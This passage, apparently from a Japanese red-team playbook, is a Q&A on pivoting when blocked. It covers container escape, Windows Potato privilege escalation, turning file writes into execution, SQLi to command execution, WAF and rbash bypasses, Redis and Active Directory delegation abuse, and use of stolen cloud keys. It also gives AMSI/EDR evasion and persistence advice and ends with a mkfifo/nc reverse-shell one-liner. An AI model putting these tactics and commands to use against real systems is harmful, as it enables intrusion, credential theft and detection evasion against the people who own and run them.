**A4**: 繰り返し撃たない。dmesg/syslog に痕跡がないか見る(EDR/監査はカーネルエラーを監視することが多い)。exp に「1 回の利用で対象状態が変わる」副作用があるかを見る(例:ファイルが作成された、プロセスが注入された)。「トリガーしなかった」か「トリガーしたが成功しなかった」かを判断し、対応を変える。
**Q5**: exp が対象マシンを kernel panic させた場合、遮断されたらどこへ方向転換するか?
**A5**: 「この経路はもう通れない」と直交転換し、かつ既に露出したかを即座に評価する。再起動後に気づかれる確率が高い。既に得た認証情報で素早く横展開する方向に転換し、同じマシンで再試行しない。カーネル exp は「成功するか、手掛かりを焼くか」の動作で、失敗即代償である。

### コンテナ内でホストへのエスケープを望む
**Q1**: コンテナ/Docker 内で root を得て、ホストに跳びたい。先に何を判断するか?
**A1**: 3 つのシグナルで素早く判断する:`/.dockerenv`/`/run/.containerenv` が存在するか。`/proc/1/cgroup` に docker/kubepods の文字があるか。`ls /` の構造が最小イメージらしいか。コンテナと確認したら「特権コンテナか」を問う(`capsh --print` で caps に sys_admin/sys_module が含まれるか)。
**Q2**: 特権コンテナ(--privileged または大量の caps)の場合、どうするか?
**A2**: 一歩でエスケープする:ホストのルートディレクトリ(`/dev/sda1` 系)をコンテナ内に `mount` する、または `cgroup release_agent` でホスト実行をトリガーする、またはカーネルモジュールをロードする。特権コンテナのエスケープ原語は山ほどあり、どれでも選べる。
**Q3**: 非特権だが、docker.sock がマウントされている場合はどうするか?
**A3**: 一歩で root と等価になる:docker クライアントで sock に接続し、`--privileged -v /:/host` の新コンテナを起動する。docker.sock がコンテナにマウントされることは、本質的にホストの root をコンテナ内に認可していることである。
**Q4**: 非特権で sock もなく、普通のコンテナの場合、遮断されたらどこへ方向転換するか?
**A4**: 「カーネル CVE + マウント確認」のディメンションに直交転換する:runc/containerd の歴史的エスケープ CVE、`/proc/self/mem` への書き込み、cgroup v1 release_agent が remount されていないか。同時にマウントポイントを確認する。多くの環境はホストディレクトリ(例 ログ/設定)をマウントしており、重要なファイル(cron/authorized_keys)を書けば跳べる。
**Q5**: カーネルもパッチ済みで異常なマウントもない場合は、諦めるか?
**A5**: 戦術を格下げする:エスケープしなくても価値はある。コンテナ内からは内部ネットワークサービス経由で他のコンテナ/ホストサービス(K8s API、metadata サービス、内部 DB)に接続できることが多い。現在の pod を踏み台にして横展開する方が、エスケープに固執するより費用対効果が高い。

### Windows に SeImpersonate/SeAssignPrimaryToken 特権がある
**Q1**: `whoami /priv` が SeImpersonatePrivilege(IIS/MSSQL/Exchange 系サービスアカウントによくある)を示す。これは何を意味するか?
**A1**: 「Potato ファミリー」で権限昇格できることを意味する:SYSTEM プロセスに模倣可能な token を渡させることができれば、自分が SYSTEM になれる。原理は RPC/COM 認証時の impersonation セマンティクスである。判定基準は本機にトリガーできる RPC/COM 面があるか(SeImpersonate を持つアカウントはほぼサービスコンテキストにあり、通常はある)。
**Q2**: どの Potato 変種を選ぶか?
**A2**: OS バージョンで選ぶ:旧システムは RottenPotato/JuicyPotato。新しめのシステムで COM ポートが封じられているなら PrintSpoofer(Spooler RPC を攻める)か RoguePotato。さらに新しく全部封じられているなら GodPotato(RPC 経由)/DCOM 変体。判定基準は先に `sc query spooler` で Spooler 状態を見て、COM サーバーを起動できるかを見ることである。
**Q3**: SeImpersonate はあるが Potato が全て失敗する(Spooler 停止、COM ポート封鎖)場合はどうするか?
**A3**: SeAssignPrimaryToken の直接利用に方向転換する:この権限がまだあれば、CreateProcessAsUser で他人の token を使って直接プロセスを起動できる。前提は token を取れること(既存プロセスを列挙して OpenProcessToken する)。「SYSTEM に token を渡させる」1 歩を省き、他のユーザーの既存 token を直接使う。
**Q4**: token も取れない(高権限プロセスへ OpenProcess できない)場合、遮断されたらどこへ方向転換するか?
**A4**: 「そのサービスアカウントの横展開価値」のディメンションに直交転換する:SeImpersonate は IIS/MSSQL 系のサービス番号に付くことが多く、これらのアカウントはドメイン内でマシンアカウントかもしれない。マシンアカウントは LDAP を読める、ADCS テンプレートに触れる、データベースに掛かるかもしれない。権限昇格しなくても横展開で多くのことをできる。
**Q5**: 本機で SYSTEM になって何かしたい場合はどうするか?
**A5**: 方案を格下げする:「SYSTEM でしかできない」ことの多くは、現在のサービスアカウント+サービスコンテキストでできる( SAM を読むには SYSTEM が必要だが、lsass を読むのはサービスアカウント+SeDebug で足りる。レジストリの一部の key 変更はサービスアカウントに権限がある)。先に「どの段階が SYSTEM を必要とするか」を正確に特定する。そもそも権限昇格が不要かもしれない。

### ファイル書き込みしかなく、直接の実行がない
**Q1**: 任意ファイル書き込みを確認したが、RCE 原語がない。書き込みを実行にどう変えるか?
**A1**: 「対象プロセスが能動的に何を読むか」で分類する:Web サービスの下に webshell を書く(パスがアクセス可能であること)、.htaccess/nginx 設定を書く(reload をトリガーできれば)、SSH `authorized_keys` を書く(対象が sshd を動かしていれば)、crontab/systemd unit を書く(権限がありディレクトリがスキャンされれば)、`.bashrc`/`.profile` を書く(次回ログインを待つ)、インタープリタの pyc/`__pycache__` を書く(ソースより新しければロードされる)。選ぶのはどのパスを書けるかによる。
**Q2**: 書けるが web ルートが分からない場合はどうするか?
**A2**: 「読み書き検知」を行う:先に識別用のマーカーファイルを一般的なパスの候補(webroot 候補 `/var/www/html`/`/usr/share/nginx/html`/カスタム)に書き、web 端から 1 つずつアクセスしてどれが表示されるか見る。またはファイル読み取り原語で先に nginx/apache 設定を読んでルートを特定する。
**Q3**: web ルートが書き込み不可で、SSH ホームディレクトリも隔離されている場合、遮断されたらどこへ方向転換するか?
**A3**: 「書き込みで実行をトリガーする」ディメンションに直交転換する:root かサービスが定期的に読む場所を探す。定番は `/etc/cron.d/`(書ければ)、`/etc/logrotate.d/`(logrotate に postrotate スクリプトがある)、`/etc/update-motd.d/`(次回 SSH ログイン時に root が実行)、systemd の `/etc/systemd/system/`。実行のタイミングをシステムプロセスに委ねる。
**Q4**: 全システムディレクトリが読み取り専用で、ユーザー空間しか書けない場合はどうするか?
**A4**: 「現在のユーザーを釣る」ディメンションに方向転換する:ユーザーホームディレクトリの `.bashrc`/`.zshrc`/`git hooks`/`.vimrc` を変更し、ユーザーが次に操作する際に実行させる。対象が運用者が使うアカウントなら、この経路は安定している。代償は待つことだけである。
**Q5**: 対象ユーザーが二度とログインしない(サービスアカウントで shell がない)場合はどうするか?
**A5**: 書き込みで直接の実行は出せないと認め、書き込みを「認証情報の補助」に使う:悪意ある SSL 証明書を書いて MITM を企てる、hosts を書いて解決を乗っ取る、公開鍵をどこかに書いて将来の接続に備える。書き込み原語の価値は即時に現れるとは限らず、伏線にできる。

### SQLi を得たが xp_cmdshell / UDF / into outfile がない
**Q1**: SQL 注入を確認し、かつ高権限アカウントだが、定番の権限昇格経路(MSSQL `xp_cmdshell`、MySQL UDF、`SELECT INTO OUTFILE`、PostgreSQL `COPY PROGRAM`)が全て失敗する。先にどう判断するか?
**A1**: 失敗原因を層別に判断する:禁止されている(設定で無効)のか、権限がない(DBA でも開けない)のか、secure-file-priv 系のサンドボックスパス制限なのか。原因ごとに対応する迂回が異なる。判定基準はエラー情報にある。単に「失敗」を見るのではなく、具体的なエラーコードを見る。
**Q2**: MSSQL の `xp_cmdshell` が禁止されているが自分が sysadmin の場合はどうするか?
**A2**: `sp_configure` できれば開き直す(`sp_configure 'xp_cmdshell', 1; RECONFIGURE`)。`sp_configure` も制限されていれば、CLR 統合(`sp_add_assembly` で悪意ある .NET アセンブリをロード)、または OLE Automation(`sp_OACreate`)に方向転換する。MSSQL の実行原語は xp_cmdshell だけではない。
**Q3**: MySQL UDF がロードできない(`secure_file_priv` が空でない)場合はどうするか?
**A3**: 「ファイル書き込みによる間接実行」のディメンションに方向転換する:web ルート、SSH ディレクトリ、cron ディレクトリに書ければ、前節の「書き込みを実行に変える」連鎖に進む。または MySQL がトリガーする接続の反撃を使う。悪意ある MySQL サーバーは `LOAD DATA LOCAL` でクライアントファイルを読める。実行できなければ値を取る。
**Q4**: PostgreSQL に `COPY PROGRAM` 権限がなく、`pg_read_server_files` もない場合、遮断されたらどこへ方向転換するか?
**A4**: 「拡張の利用 / 反対接続」のディメンションに直交転換する:PG に `dblink`/`postgres_fdw` が入っていれば SSRF 効果が生まれ、内部ネットワークの PG を検知できる。または `lo_import`/`lo_export`(ラージオブジェクト)で制限付きサンドボックス下でファイルを読む。データベースの実行原語が封じられても、ネットワーク原語は残ることが多い。
**Q5**: 完全に無路で RCE ができない場合はどうするか?
**A5**: 「データ略奪+認証情報の換金」に格下げする:データベースにあるものだけで十分なことが多い。ユーザーテーブルの hash を横展開に使い、config テーブルの平文パスワード、アプリ鍵で session を偽造する。SQLi 自体が終端の 1 つであり、必ず shell に変換する必要はない。

### WAF が大部分の payload を遮る
**Q1**: 脆弱性点は分かっているが、WAF の命中率が高く、基礎的な payload がいくつも遮られる。先にどうするか?
**A1**: WAF を層別に判断する:先にどの層を遮るか検知する。URL 層か、body か、header か、Cookie か、UA か。判定基準は payload を分割して別の位置に置き、どこが通るかを見ることである。同じ payload を位置を変えるだけで通れば、WAF は 1 層だけ監視している。
**Q2**: WAF が各層を監視するが、エンコード感度が異なる場合はどうするか?
**A2**: 「エンコードの直交」を行う:URL 二重エンコード、Unicode 全角、HTML エンティティ、Base64 パラメータ、chunked 分割、multipart 分割。多くの WAF は 1 層しかデコードしないか、ある種のコードをデコードしない。判定基準は同じ payload をエンコードを変えたときのレスポンス変化である。
**Q3**: エンコードを全て試しても遮られる(意味解析のある WAF)場合はどうするか?
**A3**: 「プロトコル層の次元下げ」のディメンションに方向転換する:HTTP バージョンを HTTP/1.0 に下げる、大量の偽 header を加える、リクエストを chunked にして分割を非定常にする、Content-Length を衝突させる(Request Smuggling のサイドチャネル)。プロトコル解析の曖昧さで、WAF とバックエンドに別々の payload を見せることができる。
**Q4**: プロトコル層も耐える場合、遮断されたらどこへ方向転換するか?
**A4**: 「WAF を経由しないバックエンド」のディメンションに直交転換する:オリジンの直結 IP を探す(履歴 DNS、SSL 証明書の SAN、SPF レコード、shodan 逆引き)、または WAF に接続していないサブドメイン/ポートを探す。WAF はその前を通るトラフィックしか遮れず、迂回すれば無効である。
**Q5**: オリジンが見つからず、サイト全体が WAF にかかっている場合はどうするか?
**A5**: 低速/低頻度の経路に方向転換する:WAF にはレートと特徴のしきい値がある。payload を非常に低頻度に散らし、毎回小さな情報だけを運ぶ(ブラインド注入 1 バイト、SSRF 1 探査)。時間を犠牲にして WAF を通す。または WAF のホワイトリスト入口(内部 API/協業先インターフェース)を探す。

### SSH ログイン後に rbash / 制限付き shell に落ちる
**Q1**: SSH は成功したが rbash(制限付き bash)などの監獄 shell に落ち、多くのコマンドが実行できない。先に何を判断するか?
**A1**: 先に制限の種別を見る:`echo $SHELL`/`echo $0` で shell 名を見る。`compgen -c` や tab 補完で使えるコマンドを見る。`cd /` を試してディレクトリ変更できるか、`PATH=/bin:$PATH` を試して PATH 変更できるかを見る。判定基準がどの層を迂回するかを決める。
**Q2**: rbash の定番の迂回方法は何か?
**A2**: 1 つは「起動時に迂回」:SSH 時に `ssh user@host -t "bash --noprofile --norc"` または `-t "/bin/sh"` で shell を直接指定し、ログイン shell の rbash ロードを迂回する。2 つ目は「既に rbash 内で迂回」:呼び出しが許可されたインタープリタ(vi/less/man/awk/find など)の内蔵 shell で抜ける。
**Q3**: 全て塞がれた(許可コマンドリストすら非常に短い)場合はどうするか?
**A3**: 「ssh の特性を原語にする」ディメンションに方向転換する:SSH は `-o ProxyCommand`、ポートフォワーディング、SFTP、SCP に対応する。shell が制限されても、SFTP チャネルでファイルを読み書きできることが多く、ポートフォワーディングでトンネルを張れる。shell ではなく SSH プロトコル自体で目的を達成する。
**Q4**: SFTP も無効で rbash だけが残る場合、遮断されたらどこへ方向転換するか?
**A4**: 「認証情報を釣る/横展開」のディメンションに直交転換する:本機が制限されているなら、現在の身元が触れられる外部リソースを利用する。履歴(`.bash_history` が読めれば、`.ssh/config` の host 定義、known_hosts)を見て、よく接続するマシンを探し、そちらを試す。制限された環境はしばしば「そのアカウントは踏み台にすぎない」というサインである。
**Q5**: 何もかも制限され、アカウントに跳べる他マシンもない場合はどうするか?
**A5**: これは純粋な「情報型」の着地点だと認め、到達性の確認と長期入口として残すためにだけ使う。無理に迂回して時間を浪費せず、別の入口や別のアカウントに投じる。

### Redis/Memcached 未認可を得たが通常の書き込み経路が禁止されている
**Q1**: Redis 未認可は成功したが、SSH key 書き込み、crontab 書き込み、主従レプリケーション RCE が全て失敗する。先に何を判断するか?
**A1**: 失敗原因を判断する:`CONFIG SET dir` が rename または無効化されたか。主従レプリケーションが rename コマンドで遮蔽されたか。`dir` 設定の書き込み先が制限されたか(ユーザー権限、SELinux)。判定基準は各動作の具体的なエラーである。ACL/rename は新版 Redis の一般的な防御である。
**Q2**: CONFIG が rename されたが、基礎的な読み書きがまだある場合はどうするか?
**A2**: 「Redis 内のデータ略奪」のディメンションに方向転換する:`KEYS *` で全スキャンし、キャッシュ内の session、API token、業務キャッシュのユーザーデータを dump する。多くのアプリは機微オブジェクトを Redis に平文で保存しており、価値は RCE に劣らない。
**Q3**: 本当に実行を落とす必要があるが、Redis 自体が書き込み経路を与えない場合、遮断されたらどこへ方向転換するか?
**A3**: 「Redis で他のサービスを攻める」ディメンションに直交転換する:SSRF 型利用。Redis は他のサービスへ任意の TCP トラフィックを送るよう誘導できる(`CLUSTER MEET` 系)。内部ネットワークに Redis に依存するアプリが Redis データを能動的に読むなら、悪意ある逆シリアル化 payload を注入する(Java エコシステムの Jedis+逆シリアル化は歴史的に複数回)。
**Q4**: 攻めるべき他サービスがない場合はどうするか?
**A4**: 「業務の汚染」のディメンションに方向転換する:Redis に保存された重要な key(session、feature flag、rate limit)を変更すれば、権限外アクセス/検証の弱体化/リスク制御の迂回ができるかもしれない。RCE ではなく業務挙動の変更だが、同じく有効な攻撃面である。
**Q5**: 書き込み権限がなく読み取り専用の場合はどうするか?
**A5**: 読み取り専用でも十分である。単純にデータを dump する。Redis は情報原語にすぎないと認め、それを「内部ネットワークの大字典」として使い切って去る。

### ドメイン認証情報はあるがローカル shell がなく、どのリモート実行を選ぶか
**Q1**: 手元にドメイン内のあるアカウントの認証情報(パスワード/hash/チケット)があるが、どのマシンにも足を踏み入れていない。対象マシンでコードを実行したい。SMB/WinRM/DCOM/WMI/RDP/SSH から 1 つ選ぶ。どう選ぶか?
**A1**: 3 つのディメンションで絞る:1 つはアカウント権限(対象のローカル管理者/リモート管理グループか)。2 つ目は対象が開くサービス(445/5985/135/3389 のどれが通るか)。3 つ目は隠蔽性(RDP は高ノイズ、psexec はファイルを落とす、WMI/WinRM は比較的軽い)。先にポート検知で候補を確定し、次に権限で絞る。
**Q2**: 445 が通り、アカウントがローカル管理者の場合、SMB を使うか?
**A2**: SMB にはいくつかのサブ選択肢がある:psexec 風(サービス起動、binary を落とす、ノイズ大)、smbexec(半対話、やや軽い)、atexec(at/schtasks のスケジュールタスク経由)、wmiexec(WMI 経由、ファイルを落とさないが 135/DCOM と一時 SMB 共有を通る)。判定基準は監査の厳格さと対話の要否である。
**Q3**: より隠蔽したい場合、WinRM を使うか?
**A3**: WinRM(5985/5986)は HTTP を通り、ログは通常のセキュリティログではなく WinRM サービスログに残り、ファイルも落とさない。前提は対象が WinRM を有効にし、アカウントが Remote Management Users グループに入っていること。判定基準はポートが通り、認証が通ることである。
**Q4**: WinRM/SMB が全て制限される(アカウント無権限、ポート閉鎖)場合、遮断されたらどこへ方向転換するか?
**A4**: 「共有/プロトコル経由のトリガー」のディメンションに直交転換する:直接実行できなくても、UNC パスでトリガーできるかもしれない(プリンタ、WebDAV)。Kerberos 委任で間接実行できるかもしれない。LDAP でドメインオブジェクトを変更して他人に代わりに実行させられるかもしれない。実行だけが唯一の手段ではなく、「状態を変えてシステムに代行させる」方が隠蔽的である。
**Q5**: どのリモート実行もできず、アカウント権限が低すぎる場合はどうするか?
**A5**: 「認証情報の昇格」のディメンションに方向転換する:低権限アカウントでもドメイン内で Kerberoast、AS-REP roast、LDAP 列挙による設定ミス探し、ADCS テンプレート乱用ができる。これらはリモート実行権限を必要とせず、DC と通信できるだけでよい。攻撃面を AD プロトコル層に移す。

### TGT を得たが制約委任の制限を受ける
**Q1**: あるアカウントの TGT を得た。S4U2Self/S4U2Proxy で任意ユーザーとして対象サービスにアクセスしたいが、エラーになる。先に何を判断するか?
**A1**: 委任の種別を判断する:無制約(unconstrained)、制約(constrained、特定の SPN のみ許可)、リソースベース制約(RBCD、対象マシン自身が設定)。それぞれ利用経路が異なる。LDAP でアカウントの `msDS-AllowedToDelegateTo` と対象の `msDS-AllowedToActOnBehalfOfOtherIdentity` を調べる。
**Q2**: 制約委任だが対象 SPN が欲しいサービスでない場合はどうするか?
**A2**: SPN 置換に方向転換する:Kerberos は S4U2Proxy で得たサービスチケットの sname フィールドを変更できる(歴史的 CVE / 意図的なプロトコル特性)。KDC が特定のフィールドを検証しない限り、CIFS チケットを HOST/LDAP の等価サービスに変更できる。判定基準は現在のパッチレベルである。
**Q3**: RBCD 経路:自分でマシンアカウントを作って RBCD を設定できるか?
**A3**: 現在のアカウントが `MachineAccountQuota > 0` か、対象 OU にマシンオブジェクトを作成できるなら、「代理マシンアカウント」を自作し、それに RBCD を対象マシンへ設定して、S4U でチケットを取る。判定基準は MAQ 値と OU 権限(ACL の CreateChild)である。
**Q4**: MAQ = 0 で ACL も使えない場合、この線が遮断されたらどこへ方向転換するか?
**A4**: 「ADCS を攻めるか既存の委任連鎖を乱用する」ディメンションに直交転換する:ADCS ESC1-11 のどれかが攻撃可能なら、直接証明書に署名してドメイン管理者を取る。またはドメイン全体の委任設定されたアカウントを列挙し、私が触れられる委任連鎖を 1 本見つけて間接的に達成する。委任は網状で、1 本が通らなければ別の 1 本に替える。
**Q5**: 委任のディメンションが全滅の場合はどうするか?
**A5**: 「通常の認証乱用への格下げ」に方向転換する:Kerberoast/AS-REP roast、LDAP 中継(ADWS/LDAP signing 未開設を攻める)、NTLM relay(LDAPS/HTTP CA を攻める)。委任は Kerberos 攻撃面の一部にすぎず、NTLM 側にも多くの原語がある。

### 鍵/token を得たが本機実行に変える方法が分からない
**Q1**: SSRF/ファイル読み取りで多くの鍵(AWS/GCP/Azure key、Docker registry token、Kubeconfig、Git token)を得た。どう実行に変えるか?
**A1**: 鍵の種別で分ける:クラウド access key → 直接クラウド API を呼んでインスタンス起動/ロール変更。kubeconfig → `kubectl` でクラスタリソースを操作。registry token → 悪意あるイメージを pull/push して次回デプロイを待つ。git token → 自動デプロイされるリポジトリに悪意あるコードをコミットする。それぞれが「正当なチャネルで実行をトリガーする」。
**Q2**: クラウド access key がある場合、最速で実行を得るには?
**A2**: 先に `sts get-caller-identity` で身元と権限を特定し、`iam list-attached-*-policies` で何ができるか見る。EC2 権限があれば RunInstances(自作 user-data に payload を入れる)。Lambda 権限があれば UpdateFunctionCode。SSM 権限があれば SendCommand で既存インスタンスに送る。権限が許し、ノイズが最小のものを選ぶ。
**Q3**: 権限が IAM condition で固く絞られ、ある bucket しか読めない場合、遮断されたらどこへ方向転換するか?
**A3**: 「読むことで別の鍵を見つける」ディメンションに直交転換する:S3 には他サービスの config/backup/ログがよくあり、ログには token 漏えいがよくある。鍵の階層的利用とは、低権限 key から高権限 key を読んで段階的に昇ることであり、一歩ずつ上がる。
**Q4**: kubeconfig があり、権限がある namespace の一般ユーザーの場合はどうするか?
**A4**: 先に `kubectl auth can-i --list` で正確な権限を見て、Pod を作成できる namespace を探す。hostPath `/` をマウントした、または privileged な Pod を起動し、Pod から node へエスケープする。または secrets を読める権限を探し、他 namespace の secrets を引き出す(ServiceAccount token を含み、昇格のディメンションになる)。
**Q5**: 権限が極小で何もできない場合はどうするか?
**A5**: この鍵の価値は「存在の証拠」だけだと認め、弱い鍵に浪費しない。同じ漏えい源に他にも鍵がないか探す方向に転換する。または永続化の予備として残す(長期有効で失効しにくい key は残す)。

### コマンド実行に出力がなく、帯域外チャネルもない
**Q1**: RCE を確認した(ファイルシステム状態の変更で検証できる)が、ページに出力がなく、外向きも全封鎖(DNS/HTTP/ICMP が全て不通)。どう結果を取るか?
**A1**: 「内向きチャネル」で行く:コマンド出力を web アクセス可能なファイルに書かせる(webroot を特定できれば)、その後 web から読む。または SQL テーブルに書く(SQL 書き込みをトリガーできれば)。またはレスポンスヘッダに埋める(レスポンス生成経路を制御できれば)。対象マシンが自分自身の中継になる。
**Q2**: web ルートが書き込み不可で、SQL 経路もない場合はどうするか?
**A2**: 「時間チャネル」を使う:コマンド実行内で結果に応じて sleep の長さを変え、HTTP レスポンス時間の差から 1 ビットずつ情報を読み戻す。非常に遅いが信頼できる。必要なのはレスポンス時間を測れるチャネルだけである。
**Q3**: 時間差が不安定(CDN/キャッシュ/非同期)で、S/N 比が低い場合はどうするか?
**A3**: 「ページ差分チャネル」に方向転換する:コマンドに結果に応じて既存の web ページに条件付きで書かせる(例:既にアクセス可能なパスにログファイルを追記)。web からページを引いて内容の差分を比較して読み戻す。これはブールブラインドの考え方の RCE 版である。
**Q4**: ページにも利用できる差分がない場合、遮断されたらどこへ方向転換するか?
**A4**: 「観測可能な外部挙動を変える」ディメンションに直交転換する:コマンドに、既に確立された接続の対向へ逆接続させる(既存の出口 IP を再利用し、新規の外向きを作らない)、または外からのリクエストに応答している worker プロセスにそれを掛けさせる(メモリ馬注入)。後続はその worker の正常なレスポンスチャネルで結果を取る。
**Q5**: 結果を取る経路が全て失敗する場合はどうするか?
**A5**: 盲状態を認めて動作を格下げする:「盲操作だがシステム状態を変える」ことには依然として価値がある。盲で webshell を落とす(後でアクセスして検証)、盲でスケジュールタスクを追加する(次回時刻を待つ)、盲で設定を変える。RCE が全盲でも「動作を予約する」原語であり、即時に値を取る必要はない。

### 権限昇格が行き詰まる - 本機に固執するか横展開か
**Q1**: 1 台のマシンで本機の権限昇格を全て試したが、1 本も通らない。続けるべきか?
**A1**: 先に「本機が対象にどれだけ必要か」を見積もる。欲しいもの(データ、次ホップの認証情報、AD 権限)が本機の root でも取れないなら、権限昇格は不要である。判定基準は「自分が何を欠いているか」を列挙することである。root でしか取れないものを欠いていなければ、昇格しない。
**Q2**: では横展開には何の条件が必要か?
**A2**: 「現在の身元が触れられる他のアセット」が必要である。`.ssh/config`/`.bash_history`/ブラウザのブックマーク/認証情報マネージャー/`~/.aws`/`~/.kube`/環境変数を調べる。低権限ユーザーでも「マシン跨ぎの身元」を持つことが多く、権限昇格を飛ばして戦場を替えられる。
**Q3**: 現在の身元が他のマシンに接続できず、この 1 台にしか紐づかない場合はどうするか?
**A3**: 「内部ネットワークのスニッフィング」のディメンションに方向転換する:現在のマシンから内部ネットワークをスキャンして開いているサービスを探す。認証情報がなくても匿名/未認可/既定パスワードを試せる。内部ネットワークの多くのサービスは、この既に攻められたマシンより脆い。低権限+ネットワーク到達性だけで新たな入口を開けることが多い。
**Q4**: 内部ネットワークスキャンも収穫がない場合、遮断されたらどこへ方向転換するか?
**A4**: 「待ち伏せと待機」のディメンションに直交転換する:本機で権限昇格も横展開もせず、永続化フックを 1 つ仕掛けて対象ユーザー/管理者の操作を待つ(`.bashrc` 変更、systemd user unit 追加、git hook 配置)。一部の権限昇格は待つしかなく、能動的にトリガーできない。同時に現在の時間で別方向の偵察を行う。
**Q5**: 時間が許さない場合はどうするか?
**A5**: この連鎖がここで止まったと認め、プロジェクト全体に戻って優先度を振り直す。本機が重要な経路でないかもしれないので、このノードを削除して別の入口に戻る。レッドチームの「諦め」は戦術であり、失敗ではない。

### AV/EDR 下の payload 配置戦略
**Q1**: 対象マシンに明らかな EDR(プロセスに CS/マイクロソフト Defender/他ベンダーが見える)がある。payload を配置したい。先に何を判断するか?
**A1**: 先に EDR がどの層を検知するか判断する:ファイルの静的シグネチャ(署名/文字列)か、メモリスキャン(AMSI/ETW)か、挙動の API 呼び出し(child_process spawn 連鎖)か、ネットワークか。層ごとに対応する回避が異なる。判定基準は先に「何もしない」空 payload を落として殺されるかを見て、段階的に機能を加えてトリガー点を特定することである。
**Q2**: 静的検知が厳しく、PE を配置すると即削除される場合はどうするか?
**A2**: 「ファイルなし」の経路に方向転換する:payload をディスクに置かず、既存のインタープリタ(信頼された CLR ホスト/スクリプトエンジン)でメモリからロードする。または「正当なツール」の経路で LOLBins を使い重要な動作をこなす。ファイル層の EDR はメモリ/正当なプロセスを固く監視できない。
**Q3**: メモリスキャン(AMSI)が PowerShell/CLR を遮る場合はどうするか?
**A3**: AMSI 迂回に方向転換する:amsi.dll の AmsiScanBuffer の先頭バイトを patch して clean を返させる、前置アンロードを hook する、または AMSI に接続していないホストに替える。前提は現在のプロセス内に、amsi メモリ自体を監視する既存の検知器が動いていないことである。
**Q4**: 挙動連鎖が固く監視され、どの spawn 子プロセスもアラートになる場合、遮断されたらどこへ方向転換するか?
**A4**: 「spawn なしで効果を達成する」ディメンションに直交転換する:データ系のニーズ(ファイル読み取り/レジストリ照会/メモリ列挙)は新プロセスを必要としない。ネットワーク系のニーズは現在のプロセス内で socket を自発できる。EDR が主に監視するのは spawn 連鎖と機微 API の組み合わせで、同一プロセスの言語層の動作はトリガー面がはるかに小さい。
**Q5**: ニーズが本当に spawn を必要とし、EDR も厳しい場合はどうするか?
**A5**: 「マシンを替える」ことに方向転換する:このマシンが固く監視されているなら無理にぶつからない。現在の認証情報で、ポリシーがより緩いマシン(DMZ の旧サーバー、一時環境、開発マシンは同じ EDR がないことが多い)へ横展開して本当の payload を走らせる。EDR のカバレッジは決して均一ではないので、窪地を探す。

### SELinux/AppArmor が動作を遮断する
**Q1**: Linux 上で明らかに権限があるのに操作が拒否される(`Permission denied` だがユーザー能力は十分)。ログに SELinux/AppArmor のアラートが見える。どうするか?
**A1**: 先にモードを見る:`getenforce` または `aa-status`。SELinux Permissive モードでは拒否を記録するが遮断しない(迂回可能)。Enforcing では本当の迂回が必要。AppArmor も同様。判定基準は、このコマンドが大量の監査ログをトリガーする価値があるかである。
**Q2**: Enforcing モードで、元々権限のない経路を使いたい場合はどうするか?
**A2**: 「コンテキストが許可する動作を選ぶ」ディメンションに方向転換する:SELinux が拒否するのは「この domain がその type に対してそのことをできない」ことであり、同じ domain でも別の type にはできる。現在のプロセスコンテキスト(`id -Z`)と対象ファイルのコンテキストを列挙し、等価な経路がないかを見る。
**Q3**: 禁止された動作を本当にやらなければならない場合はどうするか?
**A3**: 「domain を替える」ディメンションに方向転換する:transition が許可する入口(root ユーザーが initrc_t から別の domain へ移るなど)を通って間接的に達成する。または許可された domain に既にあるプロセスを探して注入する。SELinux は domain の網であり、domain を替える方が policy を破るより安上がりである。
**Q4**: domain を替えられず、注入できるプロセスもない場合、遮断されたらどこへ方向転換するか?
**A4**: 「MAC 層を迂回する」ディメンションに直交転換する:カーネル exp で直接迂回する(成功すれば SELinux を無視できる)、または kmod ロードで policy を変更する(できれば)、または policy 自体の設定ミスを探す(`sesearch` で異常ルールを探す)。コストが高いと認め、価値があるか評価する。
**Q5**: その動作がこのマシンでは不可能な場合はどうするか?
**A5**: 別のマシンに方向転換する:ポリシーはマシンごとの独立設定で、別の同役割マシンは緩いかもしれない。特定のポリシーを無理に迂回する時間を浪費しない。

### crontab/systemd/atd ディレクトリだけが書き込み可能
**Q1**: root が読むスケジュールディレクトリ(`/etc/cron.d`、`/etc/systemd/system`、at キュー)が書き込み可能なのを見つけた。どう使うか?
**A1**: 先にトリガー頻度とタイミングを判断する。cron.d のファイルは次のタイムスライスで走る(分単位)。systemd unit は daemon-reload か再起動が効く必要がある(systemctl でトリガーしない限り)。at キューは指定時刻。判定基準は「待てるか、私が能動的にトリガーできるか」である。
**Q2**: cron.d が書き込み可能な場合、毎分走るものを直接投げるか?
**A2**: できるが、フォーマットが厳格(ユーザーフィールド必須)である点に注意する。書き間違えると crontab 全体がロードを拒否される。自分の退路を残す。既存エントリを変更せず、独立ファイルを新規追加する。実行内容は絶対パスを使う(cron 環境の PATH は極小)。
**Q3**: systemd unit ディレクトリが書き込み可能だが reload 権限がない場合はどうするか?
**A3**: timer/path/socket unit 系を探す:一部の unit 種別(path unit はファイル変更を監視)は既に動いているかもしれず、それが参照する exec パスを変えれば次回トリガー時に実行される。または user unit を `~/.config/systemd/user/` に書いて、対象ユーザーのログイン時に systemd --user が自動ロードするのを待つ。
**Q4**: ディレクトリは書き込み可能だが root の crond/systemd にサンドボックス/監査がある場合、遮断されたらどこへ方向転換するか?
**A4**: 「root がトリガーする他の書き込み可能ディレクトリ」のディメンションに直交転換する:logrotate の設定スニペットディレクトリ、apt/yum の hooks、mail の aliases(`|command` 構文)、update-motd。システムで「root が能動的に読んで実行する」場所は cron/systemd だけではない。
**Q5**: 重要トリガー点が全て監査されている場合はどうするか?
**A5**: 「人を釣る」ディメンションに方向転換する:root がよく操作する場所(vim/less 設定、shell rc、git グローバル config、tmux/screen 設定)に書き、root の次回対話時にトリガーする。受動トリガーは能動トリガーより隠蔽的である。

### 組み込み/ネットワーク機器のコマンド注入が制限されている
**Q1**: ルーター/カメラ/産業制御機器を攻めている。コマンド注入点は確認したが、環境が busybox で標準ツールの多くがない。先に何を判断するか?
**A1**: 先に busybox がどの applet をサポートするか列挙する:`busybox --list` または `ls /bin`。判定基準がどの原語を使えるかを決める。多くの機器は curl/wget すら削っているが、通常 `nc`/`telnet`/`ftpget` を残す。GNU ツールの存在を前提にしない。
**Q2**: リバース shell を張りたいが nc に `-e` がない(busybox nc はしばしば exec なし)場合はどうするか?
**A2**: mkfifo + `/bin/sh` の組み合わせを使う:`mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc host port > /tmp/f`。または telnet の二重パイプ。busybox 環境のリバースの標準手法は名前付きパイプであり、-e を期待しない。
